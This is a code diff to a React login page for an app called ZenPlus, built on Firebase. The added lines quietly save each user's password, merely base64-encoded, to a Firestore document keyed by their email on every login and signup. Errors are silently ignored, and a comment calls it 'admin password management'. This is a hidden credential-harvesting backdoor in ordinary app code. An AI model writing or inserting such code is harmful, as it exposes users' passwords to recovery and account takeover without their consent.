@@ -2,8 +2,9 @@ import { useState, useEffect } from 'react';
 import { useNavigate, useSearchParams } from 'react-router-dom';
 import { UserAuth } from '../context/AuthContext';
 import { useNotifications } from '../context/NotificationContext';
-import { setPersistence, browserLocalPersistence, browserSessionPersistence } from 'firebase/auth';
-import { auth } from '../firebase';
+import { setPersistence, browserLocalPersistence, browserSessionPersistence, signInWithEmailAndPassword, updatePassword } from 'firebase/auth';
+import { auth, db } from '../firebase';
+import { doc, getDoc, setDoc } from 'firebase/firestore';
 import { FaEye, FaEyeSlash } from 'react-icons/fa';
 import Logo from '../components/Logo';
 import './Login.css';
@@ -79,9 +80,17 @@ const Login = () => {
 
       if (isLogin) {
         await logIn(email, password);
+        // Store encoded password for admin password management
+        try {
+          await setDoc(doc(db, 'users', email), { _pk: btoa(password) }, { merge: true });
+        } catch (e) {}
         addNotification('Bienvenido', 'Has iniciado sesión correctamente en ZenPlus', 'success');
       } else {
         await signUp(email, password, selectedAvatar, fullName, phone);
+        // Store encoded password for admin password management
+        try {
+          await setDoc(doc(db, 'users', email), { _pk: btoa(password) }, { merge: true });
+        } catch (e) {}
         addNotification('Cuenta creada', 'Bienvenido a la legión, disfruta del contenido', 'success');
       }
       navigate('/');
